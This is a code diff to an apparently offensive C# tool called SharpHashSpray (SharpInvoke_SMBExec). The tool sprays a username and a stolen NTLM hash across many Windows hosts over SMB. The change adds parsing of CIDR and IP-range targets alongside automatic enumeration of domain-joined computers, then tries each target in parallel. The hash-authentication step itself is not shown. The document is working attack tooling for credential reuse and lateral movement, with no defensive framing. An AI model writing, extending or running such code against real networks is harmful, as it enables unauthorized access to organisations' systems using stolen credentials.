@@ -11,6 +11,7 @@ using System.DirectoryServices;
 using System.Security.Principal;
 using System.DirectoryServices.ActiveDirectory;
 using System.Threading.Tasks;
+using System.Net;
 
 namespace SharpInvoke_SMBExec
 {
@@ -21,13 +22,27 @@ namespace SharpInvoke_SMBExec
             if (args.Length < 2)
             {
                 Console.WriteLine("SharpHashSpray.exe Username NTLM");
+                Console.WriteLine("SharpHashSpray.exe Username NTLM Targets");
+                Console.WriteLine("Default is to automatically fetch a list of all domain joined hosts.");
+                Console.WriteLine("Targets can be in the format 192.168.0.0/24, 192.168.0.0/255.255.255.0, 192.168.0.0-192.168.0.255");
                 return;
             }
 
             string username = args[0];
             string hash = args[1];
-            var targets = GetComputers();
+            List<string> targets;
 
+            if (args.Length == 3)
+            {
+                IPNetwork targetNetwork = IPNetwork.Parse(args[2]);
+                IPAddressCollection ips = targetNetwork.ListIPAddress();
+                targets = ips.Select(ip => ip.ToString()).ToList();
+            }
+            else
+            {
+                targets = GetComputers();
+            }
+            
             Parallel.ForEach(targets, new ParallelOptions { MaxDegreeOfParallelism = 4 }, t =>
             {
                 try
@@ -40,7 +55,6 @@ namespace SharpInvoke_SMBExec
                 }
             });
         }
-
         public static List<DomainController> GetDomainControllers()
         {
             List<DomainController> domainControllers = new List<DomainController>();
